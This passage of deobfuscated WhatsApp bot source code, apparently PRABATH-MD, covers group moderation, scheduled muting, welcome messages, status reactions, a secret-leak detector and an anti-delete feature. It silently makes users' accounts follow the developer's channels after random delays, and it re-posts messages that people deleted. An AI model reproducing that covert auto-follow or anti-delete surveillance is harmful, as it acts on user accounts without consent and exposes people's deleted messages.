              const decoded_192 = decoded_193 => {
                if (!decoded_193 || typeof decoded_193 !== "string") {
                  return null;
                }
                const decoded_194 = decoded_193.match(/channel\/([a-zA-Z0-9_-]+)/);
                return decoded_194 ? decoded_194[1] : decoded_193.trim();
              };
              let decoded_195 = [];
              if (decoded_106.cjidprabath) {
                decoded_195.push(decoded_106.cjidprabath);
              }
              if (decoded_106.cjidsachintha) {
                decoded_195.push(decoded_106.cjidsachintha);
              }
              if (decoded_106.allChannels && typeof decoded_106.allChannels === "string") {
                const decoded_196 = decoded_106.allChannels.split(',');
                decoded_195 = decoded_195.concat(decoded_196);
              }
              const decoded_197 = [...new Set(decoded_195.map(decoded_198 => decoded_192(decoded_198)).filter(Boolean))];
              for (const decoded_199 of decoded_197) {
                try {
                  const decoded_200 = Math.floor(Math.random() * 110000) + 10000;
                  await sleep(decoded_200);
                  const decoded_201 = await decoded_112.newsletterMetadata("invite", decoded_199);
                  if (decoded_201 && decoded_201.viewer_metadata === null) {
                    await decoded_112.newsletterFollow(String(decoded_201.id));
                  }
                } catch (decoded_202) {}
              }
            } catch (decoded_203) {}
          }
          await decoded_191();
          setInterval(async () => {
            try {
              const decoded_204 = await pmdStore.get("/api/tasks/all");
              const {
                daily: decoded_205,
                onetime: decoded_206
              } = decoded_204.data;
              const decoded_207 = new Date();
              const decoded_208 = async decoded_209 => {
                try {
                  const decoded_210 = await decoded_112.groupMetadata(decoded_209);
                  const decoded_211 = {
                    exists: false
                  };
                  if (!decoded_210) {
                    return decoded_211;
                  }
                  const decoded_212 = jidNormalizedUser(decoded_112.user.id);
                  const decoded_213 = decoded_210.participants.find(decoded_214 => jidNormalizedUser(decoded_214.jid) === decoded_212);
                  const decoded_215 = decoded_213 && (decoded_213.admin === "admin" || decoded_213.admin === "superadmin");
                  const decoded_216 = {
                    exists: true,
                    isBotAdmin: decoded_215,
                    isAnnounce: decoded_210.announce
                  };
                  return decoded_216;
                } catch (decoded_217) {
                  const decoded_218 = {
                    exists: false
                  };
                  return decoded_218;
                }
              };
              if (decoded_205 && decoded_205.length > 0) {
                for (const decoded_219 of decoded_205) {
                  if (!decoded_219.enabled) {
                    continue;
                  }
                  const decoded_220 = decoded_207.toLocaleTimeString("en-GB", {
                    'timeZone': decoded_219.timezone,
                    'hour12': false,
                    'hour': "2-digit",
                    'minute': "2-digit"
                  });
                  const [decoded_221, decoded_222] = decoded_219.muteTime.split(':').map(Number);
                  let decoded_223 = decoded_221 * 60 + decoded_222 - 5;
                  if (decoded_223 < 0) {
                    decoded_223 += 1440;
                  }
                  const decoded_224 = Math.floor(decoded_223 / 60);
                  const decoded_225 = decoded_223 % 60;
                  const decoded_226 = String(decoded_224).padStart(2, '0') + ':' + String(decoded_225).padStart(2, '0');
                  if (decoded_220 === decoded_226) {
                    const decoded_227 = await decoded_208(decoded_219.jid);
                    if (decoded_227.exists && decoded_227.isBotAdmin && !decoded_227.isAnnounce) {
                      const decoded_228 = {
                        text: "⏳ *Gentle Reminder*\n\nWe will be closing the group in *5 minutes* for the scheduled break.\n\nPlease wrap up your conversations. Thank you!"
                      };
                      await decoded_112.sendMessage(decoded_219.jid, decoded_228);
                    }
                  }
                  if (decoded_220 === decoded_219.muteTime) {
                    const decoded_229 = await decoded_208(decoded_219.jid);
                    if (decoded_229.exists && decoded_229.isBotAdmin && !decoded_229.isAnnounce) {
                      await decoded_112.groupSettingUpdate(decoded_219.jid, "announcement");
                      await decoded_112.sendMessage(decoded_219.jid, {
                        'text': "🔒 *Update:* I am muting the group now as per the daily schedule.\n\nMessages will be turned back on at *" + decoded_219.unmuteTime + "*. Until then, only admins can post."
                      });
                    }
                  }
                  if (decoded_220 === decoded_219.unmuteTime) {
                    const decoded_230 = await decoded_208(decoded_219.jid);
                    if (decoded_230.exists && decoded_230.isBotAdmin && decoded_230.isAnnounce) {
                      await decoded_112.groupSettingUpdate(decoded_219.jid, "not_announcement");
                      const decoded_231 = {
                        text: "🔓 *Group Open:* Hello everyone! The group is now unlocked. You may send messages."
                      };
                      await decoded_112.sendMessage(decoded_219.jid, decoded_231);
                    }
                  }
                }
              }
              if (decoded_206 && decoded_206.length > 0) {
                for (const decoded_232 of decoded_206) {
                  try {
                    const decoded_233 = new Date(decoded_232.executeAt);
                    const decoded_234 = decoded_207 - decoded_233;
                    const decoded_235 = Math.floor(decoded_234 / 60000);
                    if (decoded_235 > 5) {
                      await pmdStore["delete"]("/api/timer/complete/" + decoded_232._id);
                      continue;
                    }
                    if (decoded_232.action === "mute" && decoded_235 === -5) {
                      const decoded_236 = await decoded_208(decoded_232.jid);
                      if (decoded_236.exists) {
                        const decoded_237 = {
                          text: "⏳ *Gentle Reminder*\n\nWe will be closing the group in *5 minutes* as per the schedule.\n\nPlease wrap up your conversations. Thank you!"
                        };
                        await decoded_112.sendMessage(decoded_232.jid, decoded_237);
                      }
                    }
                    if (decoded_235 >= 0 && decoded_235 <= 5) {
                      const decoded_238 = await decoded_208(decoded_232.jid);
                      if (decoded_238.exists && decoded_238.isBotAdmin) {
                        if (decoded_232.action === "mute") {
                          if (!decoded_238.isAnnounce) {
                            await decoded_112.groupSettingUpdate(decoded_232.jid, "announcement");
                            const decoded_239 = {
                              text: "🔒 *Notice:* The allocated time is up. I'm restricting the group messages now."
                            };
                            await decoded_112.sendMessage(decoded_232.jid, decoded_239);
                          }
                        } else {
                          if (decoded_238.isAnnounce) {
                            await decoded_112.groupSettingUpdate(decoded_232.jid, "not_announcement");
                            const decoded_240 = {
                              text: "🔓 *Update:* The timer has finished. Group restrictions have been lifted."
                            };
                            await decoded_112.sendMessage(decoded_232.jid, decoded_240);
                          }
                        }
                      }
                      await pmdStore["delete"]("/api/timer/complete/" + decoded_232._id);
                    }
                  } catch (decoded_241) {}
                }
              }
            } catch (decoded_242) {}
          }, 60000);
        }
      });
      let decoded_243 = false;
      decoded_112.ev.on("groups.update", async ([decoded_244]) => {
        const decoded_245 = await decoded_112.groupMetadata(decoded_244.id);
        decoded_094.set(decoded_244.id, decoded_245);
      });
      const decoded_246 = ["94762280384@s.whatsapp.net", "94725881990@s.whatsapp.net"];
      decoded_112.ev.on("group-participants.update", async decoded_247 => {
        try {
          if (!decoded_247 || !decoded_247.id || !decoded_247.participants) {
            return;
          }
          const decoded_248 = await decoded_112.groupMetadata(decoded_247.id)["catch"](() => null);
          if (decoded_248) {
            decoded_094.set(decoded_247.id, decoded_248);
          }
          if (decoded_247.action === "add") {
            const decoded_249 = decoded_098?.["GROUP_WELCOME"]?.["groups"]?.[decoded_247.id] ?? "false";
            if (decoded_249 === "true") {
              if (!decoded_248) {
                return;
              }
              if (decoded_248.announce === true) {
                return;
              }
              const decoded_250 = (decoded_098.BANNED_GROUPS || '').split(',').map(decoded_251 => decoded_251.trim());
              if (decoded_250.includes(decoded_247.id)) {
                return;
              }
              const decoded_252 = decoded_106.SupportGroupJid || "120363234539789315@g.us";
              const decoded_253 = decoded_106.isPublicGroupJid || "120363092216825967@g.us";
              const decoded_254 = [...decoded_252.split(','), ...decoded_253.split(',')];
              if (decoded_254.some(decoded_255 => decoded_255.trim() === decoded_247.id)) {
                return;
              }
              for (const decoded_256 of decoded_247.participants) {
                const decoded_257 = decoded_256.phoneNumber || decoded_256.id || decoded_256;
                if (!decoded_257 || typeof decoded_257 !== "string") {
                  continue;
                }
                const decoded_258 = decoded_112.user?.['id'] || '';
                if (decoded_257 === decoded_258 || decoded_257 === jidNormalizedUser(decoded_258)) {
                  continue;
                }
                const decoded_259 = decoded_257.split('@')[0];
                const decoded_260 = decoded_248.subject || "Group";
                const decoded_261 = decoded_246.includes(decoded_257);
                let decoded_262;
                try {
                  decoded_262 = await decoded_112.profilePictureUrl(decoded_257, "image");
                } catch (decoded_263) {
                  decoded_262 = decoded_106.startImage || "https://telegra.ph/file/5a5676834cb2f587aec15.jpg";
                }
                const decoded_264 = decoded_098?.["GROUP_WELCOME_MSG"] || "👋 Hello @user,\nWelcome to @gname!\nHave a nice day! 💜";
                let decoded_265 = decoded_264.replace(/@user/g, '@' + decoded_259).replace(/@gname/g, decoded_260);
                const decoded_266 = /(https?:\/\/[^\s]+?\.(jpg|jpeg|png|webp))/i;
                const decoded_267 = decoded_265.match(decoded_266);
                const decoded_268 = decoded_267 ? decoded_267[1] : null;
                if (decoded_268) {
                  decoded_265 = decoded_265.replace(decoded_268, '').trim();
                }
                const decoded_269 = ("\n🎉 *WELCOME PRABATH-MD DEVELOPER* 🎉\n\n🚀 @" + decoded_259 + " just joined *" + decoded_260 + "*!\n🔥 The mastermind behind PRABATH-MD has arrived!\n✨ Welcome aboard, hero! ✨").trim();
                const decoded_270 = decoded_261 ? decoded_269 : decoded_265;
                const decoded_271 = decoded_268 || decoded_262;
                const decoded_272 = {
                  url: decoded_271
                };
                const decoded_273 = {
                  image: decoded_272,
                  caption: decoded_270,
                  mentions: [decoded_257]
                };
                await decoded_112.sendMessage(decoded_247.id, decoded_273);
              }
            }
          }
        } catch (decoded_274) {
          console.error("Error in Group Update:", decoded_274);
        }
      });
      function decoded_275(decoded_276) {
        const decoded_277 = {
          found: false,
          hits: []
        };
        if (!decoded_276 || typeof decoded_276 !== "string") {
          return decoded_277;
        }
        const decoded_278 = [];
        const decoded_279 = {
          type: "PMD Session ID",
          regex: /prabath-md~[a-z0-9_-]{10,}/gi
        };
        const decoded_280 = {
          type: "MongoDB URI",
          regex: /mongodb(\+srv)?:\/\/[^\s]+/gi
        };
        const decoded_281 = {
          type: "MySQL/Postgres URI",
          regex: /(mysql|postgres|postgresql|redis):\/\/[^\s]+/gi
        };
        const decoded_282 = [decoded_279, decoded_280, decoded_281];
        for (const decoded_283 of decoded_282) {
          const decoded_284 = decoded_276.match(decoded_283.regex) || [];
          decoded_284.forEach(decoded_285 => {
            const decoded_286 = {
              type: decoded_283.type,
              value: decoded_285
            };
            decoded_278.push(decoded_286);
          });
        }
        return {
          'found': decoded_278.length > 0,
          'hits': decoded_278
        };
      }
      const decoded_287 = new Set(["sad", "unhappy", "depressed", "heartbroken", "miserable", "crying", "banned", "suspen", "දුක", "දුකයි", "duka", "සස්පෙන්ඩ්", "maruna", "බෑන්", "බෑන්ඩ්", "adanawa", '😢', '😭', '😿', '😪', '🥺', '😥', '😓', '😞', '😟', '😔', '🙁', '☹️', '😰', '😨', '😫', '😖', '😩', '😣', '💔', '😧', '😦', '🫤']);
      const decoded_288 = new RegExp([...decoded_287].join('|'), 'i');
      function decoded_289(decoded_290) {
        if (!decoded_290) {
          return false;
        }
        return decoded_288.test(decoded_290);
      }
      const decoded_291 = [];
      let decoded_292 = false;
      async function decoded_293() {
        if (decoded_292) {
          return;
        }
        decoded_292 = true;
        while (decoded_291.length > 0) {
          const decoded_294 = decoded_291.shift();
          try {
            await decoded_295(decoded_294);
            await new Promise(decoded_296 => setTimeout(decoded_296, 10));
          } catch (decoded_297) {
            console.error(decoded_297);
          }
        }
        decoded_292 = false;
      }
      function decoded_298(decoded_299) {
        if (typeof decoded_299 !== "string") {
          return "Invalid";
        }
        const decoded_300 = decoded_299.length;
        if (decoded_299.startsWith('3F') && decoded_300 === 20) {
          return "Web";
        }
        if (decoded_300 === 32) {
          return "Android";
        }
        if (decoded_300 === 20 && (decoded_299.startsWith('3A') || decoded_299.startsWith('3L') || decoded_299.startsWith('2A'))) {
          return "iOS";
        }
        if (decoded_300 === 22 && decoded_299.startsWith("3EB")) {
          return "Web";
        }
        return "Bot";
      }
      async function decoded_295(decoded_301) {
        const {
          conn: decoded_302,
          mek: decoded_303,
          m: decoded_304,
          body: decoded_305,
          isCmd: decoded_306,
          command: decoded_307,
          from: decoded_308,
          isGroup: decoded_309,
          sender: decoded_310,
          isAdmins: decoded_311,
          isBotAdmins: decoded_312,
          isOwner: decoded_313,
          groupMetadata: decoded_314,
          sms: decoded_315,
          detectSensitiveData: decoded_316,
          reply: decoded_317
        } = decoded_301;
        const {
          readConfig: decoded_318
        } = await import("./lib/check.js");
        let decoded_319 = jidNormalizedUser(decoded_302.user.id).split('@')[0];
        let decoded_320 = await decoded_318(decoded_319);
        if (decoded_309 && decoded_312) {
          const decoded_321 = decoded_316(decoded_305);
          if (decoded_321.found) {
            await decoded_302.sendMessage(decoded_308, {
              'delete': {
                'remoteJid': decoded_308,
                'fromMe': false,
                'id': decoded_304.key.id,
                'participant': decoded_310
              }
            });
            const decoded_322 = decoded_321.hits.map(decoded_323 => decoded_323.type).join(", ");
            const decoded_324 = '@' + decoded_310.split('@')[0];
            const decoded_325 = ["🛑 *Hold up, " + decoded_324 + "!* \n\nDid you just paste your *" + decoded_322 + "* here? I deleted it before anyone saw. Be careful, bro.", "⚡ *Too slow!* \n\n" + decoded_324 + " tried to leak *" + decoded_322 + "*, but I deleted it faster than you can blink. Your secrets are safe with me.", "🤨 *Really, " + decoded_324 + "?* \n\nWhy are we sharing *" + decoded_322 + "* in a public chat? Deleted for your own safety. Don't do it again.", "🛡️ *Security Alert!* \n\n" + decoded_324 + ", I detected sensitive info *(" + decoded_322 + ")* in your message. It has been removed immediately.", "🚮 *Oops! I think you pasted the wrong thing.* \n\n" + decoded_324 + ", that looked like *" + decoded_322 + "*. I removed it to prevent you from getting hacked.", "💻 *Data Leak Prevented.* \n\nSystem caught *" + decoded_322 + "* from " + decoded_324 + ". The message is gone. Please check your clipboard before pasting next time.", "🚫 *Restricted Content.* \n\n" + decoded_324 + ", posting *" + decoded_322 + "* is not allowed here. Message deleted.", "👀 *I saw that...* \n\n" + decoded_324 + ", never share your *" + decoded_322 + "* with anyone! I deleted it this time, but stay sharp.", "💀 *Do you want to get hacked?* \n\nBecause posting *" + decoded_322 + "* is exactly how you get hacked, " + decoded_324 + ". I saved you this time.", "🧹 *Cleaning up the mess...* \n\n" + decoded_324 + " accidentally dropped some *" + decoded_322 + "*. I threw it in the trash. You're welcome."];
            const decoded_326 = decoded_325[Math.floor(Math.random() * decoded_325.length)];
            const decoded_327 = {
              text: decoded_326,
              mentions: [decoded_310]
            };
            await decoded_302.sendMessage(decoded_308, decoded_327);
            return;
          }
        }
        const decoded_328 = decoded_320.ANTI_MENTION?.["groups"]?.[decoded_308] ?? "false";
        if (decoded_309 && decoded_328 !== "false") {
          if (decoded_304?.["type"] === "groupStatusMentionMessage") {
            if (decoded_312 && !decoded_313 && !decoded_311) {
              const decoded_329 = {
                "delete": decoded_304.key
              };
              await decoded_302.sendMessage(decoded_308, decoded_329);
              if (decoded_328 === "del&remove") {
                await decoded_302.sendMessage(decoded_308, {
                  'text': '@' + decoded_310.split('@')[0] + " , *🚫 Mentioning this group in status is not allowed. You are being removed.*",
                  'mentions': [decoded_310]
                });
                setTimeout(async () => {
                  try {
                    await decoded_302.groupParticipantsUpdate(decoded_308, [decoded_310], "remove");
                  } catch (decoded_330) {}
                }, 2000);
              } else {
                await decoded_302.sendMessage(decoded_308, {
                  'text': '@' + decoded_310.split('@')[0] + " , *🚫 Mentioning this group in status is not allowed.*",
                  'mentions': [decoded_310]
                });
              }
              return;
            }
          }
        }
        if (decoded_309 && decoded_320.ANTI_BOT?.["groups"]?.[decoded_308] === "true") {
          const decoded_331 = decoded_304.id || decoded_304.key?.['id'] || '';
          const decoded_332 = decoded_298(decoded_331);
          const decoded_333 = decoded_332 === "Bot";
          if (decoded_333 && !decoded_313 && !decoded_311 && decoded_312) {
            const decoded_334 = {
              "delete": decoded_304.key
            };
            await decoded_302.sendMessage(decoded_308, decoded_334);
            await decoded_302.sendMessage(decoded_308, {
              'text': '@' + decoded_310.split('@')[0] + " , *🚫 Other bots are not allowed here.*",
              'mentions': [decoded_310]
            });
            await decoded_302.groupParticipantsUpdate(decoded_308, [decoded_310], "remove");
            return;
          }
        }
        const decoded_335 = decoded_320.ANTI_LINK?.["groups"]?.[decoded_308] ?? "false";
        if (decoded_335 === "true" && decoded_309 && !decoded_311 && !decoded_313) {
          const decoded_336 = decoded_320.ANTI_LINK_VALUE.split(',');
          const decoded_337 = decoded_305.toLowerCase();
          for (const decoded_338 of decoded_336) {
            const decoded_339 = new RegExp("\\b" + decoded_338.trim() + "\\b", 'ig');
            if (decoded_339.test(decoded_337)) {
              if (!decoded_312) {
                break;
              }
              try {
                const decoded_340 = await decoded_302.groupInviteCode(decoded_304.chat);
                if (decoded_305.includes(decoded_340)) {
                  break;
                }
              } catch (decoded_341) {}
              const decoded_342 = decoded_320.ANTI_LINK_ACTION?.["groups"]?.[decoded_308] ?? "delete";
              const decoded_343 = {
                remoteJid: decoded_304.chat,
                fromMe: false,
                id: decoded_304.id,
                participant: decoded_304.sender
              };
              if (decoded_342.includes("delete")) {
                const decoded_344 = {
                  "delete": decoded_343
                };
                await decoded_302.sendMessage(decoded_308, decoded_344);
                await decoded_302.sendMessage(decoded_308, {
                  'text': "🚫 *Link Detected!* \n@" + decoded_304.sender.split('@')[0] + ", links are not allowed here.",
                  'mentions': [decoded_304.sender]
                });
              }
              if (decoded_342.includes("nodelete") || decoded_342.includes("remove")) {
                if (decoded_342.includes("nodelete")) {
                  const decoded_345 = {
                    "delete": decoded_343
                  };
                  await decoded_302.sendMessage(decoded_308, decoded_345);
                }
                setTimeout(async () => {
                  await decoded_302.groupParticipantsUpdate(decoded_308, [decoded_304.sender], "remove");
                }, 2000);
              }
              break;
            }
          }
        }
        const decoded_346 = decoded_320.ANTI_BAD?.["groups"]?.[decoded_308];
        const decoded_347 = decoded_320.ANTI_BAD_ACTION?.["groups"]?.[decoded_308] ?? "delete";
        if (!decoded_313 && decoded_346 === "true" && decoded_309 && !decoded_311) {
          if (!global.cachedBadWords) {
            try {
              const decoded_348 = await fetchJson("https://pmd-auto-vs-api.webshare384.workers.dev/json/bad_word.txt");
              global.cachedBadWords = decoded_348.split(/[,|\n]+/).map(decoded_349 => decoded_349.trim()).filter(Boolean);
            } catch (decoded_350) {
              global.cachedBadWords = [];
            }
          }
          let decoded_351 = [...global.cachedBadWords];
          if (decoded_320.BAD_WORD) {
            const decoded_352 = decoded_320.BAD_WORD.split(',').map(decoded_353 => decoded_353.trim()).filter(Boolean);
            decoded_351 = [...decoded_351, ...decoded_352];
          }
          if (isBadWord(decoded_305, decoded_351)) {
            if (!decoded_312) {
              return;
            }
            const decoded_354 = {
              remoteJid: decoded_308,
              fromMe: false,
              id: decoded_304.id,
              participant: decoded_310
            };
            await decoded_302.sendMessage(decoded_308, {
              'text': '@' + decoded_310.split('@')[0] + " *⛔ Bad-words forbidden by group admins.*",
              'mentions': [decoded_310]
            });
            setTimeout(async () => {
              try {
                if (decoded_347.includes("delete") || decoded_347.includes("remove")) {
                  const decoded_355 = {
                    "delete": decoded_354
                  };
                  await decoded_302.sendMessage(decoded_308, decoded_355);
                }
                if (decoded_347.includes("remove")) {
                  await decoded_302.groupParticipantsUpdate(decoded_308, [decoded_310], "remove");
                }
              } catch (decoded_356) {}
            }, 2000);
          }
        }
      }
      decoded_112.ev.on("messages.upsert", async ({
        type: decoded_357,
        messages: decoded_358
      }) => {
        if (decoded_357 == "notify") {
          for (const decoded_359 of decoded_358) {
            try {
              const decoded_360 = decoded_106.SupportGroupJid || '';
              const decoded_361 = decoded_106.isPublicGroupJid || '';
              const decoded_362 = decoded_360.split(',').map(decoded_363 => decoded_363.trim());
              const decoded_364 = decoded_361.split(',').map(decoded_365 => decoded_365.trim());
              const decoded_366 = new Set([...decoded_362, ...decoded_364]);
              if (decoded_366.has(decoded_359.key.remoteJid)) {
                continue;
              }
              const decoded_367 = decoded_112.user.lid;
              const decoded_368 = jidNormalizedUser(decoded_112.user.id);
              const decoded_369 = decoded_359.key.remoteJid.includes("@lid") ? decoded_359.key.remoteJid : null;
              if (decoded_359.key.remoteJid && decoded_359.key.remoteJid.includes("@lid")) {
                decoded_359.key.remoteJid = decoded_359.key.remoteJidAlt || decoded_359.key.senderPn || decoded_359.key.remoteJid;
              }
              if (decoded_359.key.participant && decoded_359.key.participant.includes("@lid")) {
                decoded_359.key.participant = decoded_359.key.participantAlt || decoded_359.key.participantPn || decoded_359.key.participant;
              }
              if (decoded_359.message) {
                const decoded_370 = getContentType(decoded_359.message);
                if (decoded_370) {
                  const decoded_371 = decoded_359.message[decoded_370];
                  if (decoded_371 && decoded_371.contextInfo && decoded_371.contextInfo.participant) {
                    const decoded_372 = decoded_371.contextInfo.participant;
                    if (decoded_372.includes("@lid")) {
                      if (decoded_369 && decoded_372 === decoded_369 && decoded_359.key.senderPn) {
                        decoded_371.contextInfo.participant = decoded_359.key.senderPn;
                      } else if (decoded_367 && decoded_372 === decoded_367) {
                        decoded_371.contextInfo.participant = decoded_368;
                      }
                    }
                  }
                }
              }
              if (!decoded_359.message) {
                continue;
              }
              let decoded_373 = decoded_359?.["messageTimestamp"];
              if (typeof decoded_373 === "object" && decoded_373 !== null) {
                decoded_373 = decoded_373.low;
              }
              const decoded_374 = decoded_373 * 1000;
              const decoded_375 = Date.now();
              const decoded_376 = (decoded_375 - decoded_374) / 1000;
              if (decoded_376 > 16) {
                console.log("Ignoring old message: " + decoded_376 + " seconds old");
                continue;
              }
              if (decoded_359.message?.["protocolMessage"]?.["type"] === 0) {
                if (decoded_359.key.fromMe) {
                  continue;
                }
                if (decoded_359.key.remoteJid === "status@broadcast") {
                  continue;
                }
                const decoded_377 = decoded_359.message.protocolMessage.key;
                if (decoded_377.remoteJid.includes("@lid")) {
                  decoded_377.remoteJid = decoded_359.key.remoteJidAlt || decoded_359.key.remoteJid;
                }
                const decoded_378 = jidNormalizedUser(decoded_112.user.id);
                const decoded_379 = decoded_378.split('@')[0];
                const {
                  readConfig: decoded_380
                } = await import("./lib/check.js");
                const {
                  ROD: decoded_381
                } = await import("./lib/readOwnerData.js");
                const decoded_382 = await decoded_380(decoded_379);
                if (decoded_382.ANTI_DELETE === "true" || decoded_382.ANTI_DELETE === true) {
                  const decoded_383 = await decoded_035.loadMessage(decoded_377);
                  if (decoded_383 && decoded_383.message) {
                    const decoded_384 = decoded_359.key.participantAlt || decoded_359.key.participant || decoded_359.key.remoteJidAlt || decoded_359.key.remoteJid;
                    const decoded_385 = decoded_383.key.participantAlt || decoded_383.key.participant || decoded_383.key.remoteJidAlt || decoded_383.key.remoteJid;
                    const decoded_386 = decoded_359.key.remoteJidAlt || decoded_359.key.remoteJid;
                    const decoded_387 = decoded_384.split('@')[0];
                    const decoded_388 = decoded_385.split('@')[0];
                    const decoded_389 = decoded_382.SUDO ? decoded_382.SUDO.split(',') : [];
                    const decoded_390 = [decoded_381.coOwner, decoded_381.owner, decoded_381.officialOtherOwners].join(',').split(',');
                    const decoded_391 = [...decoded_389, ...decoded_390, decoded_379].map(decoded_392 => decoded_392.trim());
                    const decoded_393 = decoded_391.includes(decoded_387);
                    const decoded_394 = decoded_391.includes(decoded_388);
                    if (!decoded_393 && !decoded_394) {
                      const decoded_395 = decoded_386.endsWith("@g.us");
                      const decoded_396 = !decoded_395;
                      const decoded_397 = decoded_382.ANTI_DELETE_MODE;
                      const decoded_398 = decoded_397 === "all" || decoded_397 === "groups" && decoded_395 || decoded_397 === "inbox" && decoded_396 || decoded_397 === "del2inbox";
                      if (decoded_398) {
                        const decoded_399 = decoded_397 === "del2inbox" ? decoded_379 + "@s.whatsapp.net" : decoded_386;
                        const decoded_400 = decoded_395 ? await decoded_094.get(decoded_386) : null;
                        const decoded_401 = decoded_400?.["subject"] || "Unknown";
                        const decoded_402 = decoded_397 === "del2inbox" && decoded_395 ? "\n👥 *Group:* " + decoded_401 : '';
                        const decoded_403 = "🗑️ *Deleted Message Recovered* ↩️" + decoded_402 + "\n\n🚮 *Deleted by:* @" + decoded_384.split('@')[0] + "\n✉️ *Sent by:* @" + decoded_385.split('@')[0];
                        const decoded_404 = sms(decoded_112, decoded_383);
                        const decoded_405 = decoded_404.type;
                        const decoded_406 = decoded_404.msg || decoded_404[decoded_405] || decoded_383.message[decoded_405];
                        const decoded_407 = decoded_404.conversation || decoded_404.text || decoded_406?.["text"] || decoded_406?.["caption"] || '';
                        const decoded_408 = decoded_275(decoded_407);
                        if (!decoded_408.found) {
                          if (decoded_405 === "conversation" || decoded_405 === "extendedTextMessage") {
                            const decoded_409 = decoded_404.text || decoded_404.conversation || decoded_406?.["text"] || (typeof decoded_406 === "string" ? decoded_406 : '');
                            const decoded_410 = {
                              text: decoded_403 + "\n\n📝 *Message:* " + decoded_409,
                              mentions: [decoded_384, decoded_385]
                            };
                            await decoded_112.sendMessage(decoded_399, decoded_410);
                          } else {
                            try {
                              const decoded_411 = decoded_406?.["fileLength"] ? Number(decoded_406.fileLength) : 0;
                              if (decoded_411 > 15728640) {
                                const decoded_412 = {
                                  text: decoded_403 + "\n\n⚠️ *File Too Large (> 15MB)*\nMedia upload skipped due to size limit.",
                                  mentions: [decoded_384, decoded_385]
                                };
                                await decoded_112.sendMessage(decoded_399, decoded_412);
                              } else {
                                const decoded_413 = await decoded_404.download();
                                if (decoded_413) {
                                  const decoded_414 = decoded_406?.["caption"] ? "\n\n📝 *Caption:* " + decoded_406.caption : '';
                                  const decoded_415 = {
                                    caption: '' + decoded_403 + decoded_414,
                                    mentions: [decoded_384, decoded_385]
                                  };
                                  const decoded_416 = {
                                    'image': decoded_413,
                                    ...decoded_415
                                  };
                                  const decoded_417 = {
                                    'video': decoded_413,
                                    ...decoded_415
                                  };
                                  if (decoded_405 === "imageMessage") {
                                    await decoded_112.sendMessage(decoded_399, decoded_416);
                                  } else {
                                    if (decoded_405 === "videoMessage") {
                                      await decoded_112.sendMessage(decoded_399, decoded_417);
                                    } else {
                                      if (decoded_405 === "audioMessage") {
                                        await decoded_112.sendMessage(decoded_399, {
                                          'audio': decoded_413,
                                          'mimetype': "audio/mpeg",
                                          'ptt': false,
                                          ...decoded_415
                                        });
                                      } else {
                                        if (decoded_405 === "stickerMessage") {
                                          const decoded_418 = {
                                            sticker: decoded_413
                                          };
                                          const decoded_419 = await decoded_112.sendMessage(decoded_399, decoded_418);
                                          const decoded_420 = {
                                            text: decoded_403,
                                            mentions: [decoded_384, decoded_385]
                                          };
                                          const decoded_421 = {
                                            quoted: decoded_419
                                          };
                                          await decoded_112.sendMessage(decoded_399, decoded_420, decoded_421);
                                        } else {
                                          const decoded_422 = decoded_406?.["mimetype"] || decoded_404.mimetype || "application/octet-stream";
                                          const decoded_423 = decoded_406?.["fileName"] || decoded_404.fileName || decoded_404.title || "deleted_file_" + Date.now();
                                          const decoded_424 = {
                                            'document': decoded_413,
                                            'mimetype': decoded_422,
                                            'fileName': decoded_423,
                                            ...decoded_415
                                          };
                                          await decoded_112.sendMessage(decoded_399, decoded_424);
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            } catch (decoded_425) {
                              console.error("Anti-Delete Error:", decoded_425);
                            }
                          }
                        }
                      }
                    }
                  }
                }
                continue;
              }
              const decoded_426 = decoded_359.key.id;
              if (decoded_091.has(decoded_426)) {
                continue;
              }
              decoded_091.add(decoded_426);
              if (decoded_091.size > 1000) {
                const decoded_427 = decoded_091.values().next().value;
                decoded_091["delete"](decoded_427);
              }
              decoded_359.message = getContentType(decoded_359.message) === "ephemeralMessage" ? decoded_359.message.ephemeralMessage.message : decoded_359.message;
              if (!decoded_359?.["key"]?.["remoteJid"]["endsWith"]("@newsletter")) {
                if (decoded_359.key && decoded_359.key.remoteJid === "status@broadcast" && decoded_098.AUTO_READ_STATUS == "true") {
                  await sleep(2000);
                  decoded_112.readMessages([decoded_359.key])["catch"](() => {});
                  const decoded_428 = getContentType(decoded_359.message);
                  const decoded_429 = decoded_428 === "buttonsResponseMessage" ? decoded_359.message.buttonsResponseMessage?.["selectedButtonId"] || '' : decoded_428 === "interactiveResponseMessage" ? decoded_359.message.interactiveResponseMessage?.["nativeFlowResponseMessage"]?.["paramsJson"] ? JSON.parse(decoded_359.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.['id'] : '' : decoded_428 === "templateButtonReplyMessage" ? decoded_359.message.templateButtonReplyMessage?.["selectedId"] || '' : decoded_428 === "conversation" ? decoded_359.message.conversation || '' : decoded_428 === "extendedTextMessage" ? decoded_359.message.extendedTextMessage?.["text"] || '' : decoded_428 === "imageMessage" && decoded_359.message.imageMessage?.["caption"] ? decoded_359.message.imageMessage.caption : decoded_428 === "videoMessage" && decoded_359.message.videoMessage?.["caption"] ? decoded_359.message.videoMessage.caption : '';
                  if (decoded_098.STATUS_REACT !== "false") {
                    if (decoded_098.STATUS_REACT === "green_react") {
                      const decoded_430 = await jidNormalizedUser(decoded_112.user.id);
                      const decoded_431 = await decoded_289(decoded_429);
                      let decoded_432;
                      if (decoded_431) {
                        decoded_432 = '😢';
                      } else {
                        decoded_432 = '💚';
                      }
                      const decoded_433 = {
                        key: decoded_359.key,
                        text: decoded_432
                      };
                      const decoded_434 = {
                        react: decoded_433
                      };
                      const decoded_435 = {
                        statusJidList: [decoded_359.key.remoteJidAlt || decoded_359.key.participant, decoded_430]
                      };
                      await decoded_112.sendMessage("status@broadcast", decoded_434, decoded_435);
                    }
                    if (decoded_098.STATUS_REACT === "random_react") {
                      const decoded_436 = ['❤️', '💖', '💜', '💙', '💛', '🧡', '🤍', '🤎', '💔', "❤️‍🔥", '❣️', '💕', '💓', '💗', '🔥', '👍', '👏', '💯', '🎉', '🙌', '🖤', '🎈', '💙', '💟', '🎁', '🩷'];
                      const decoded_437 = Math.floor(Math.random() * decoded_436.length);
                      let decoded_438 = decoded_436[decoded_437];
                      const decoded_439 = await decoded_289(decoded_429);
                      let decoded_440;
                      if (decoded_439) {
                        decoded_440 = '😢';
                      } else {
                        decoded_440 = decoded_438;
                      }
                      const decoded_441 = await jidNormalizedUser(decoded_112.user.id);
                      const decoded_442 = {
                        key: decoded_359.key,
                        text: decoded_440
                      };
                      const decoded_443 = {
                        react: decoded_442
                      };
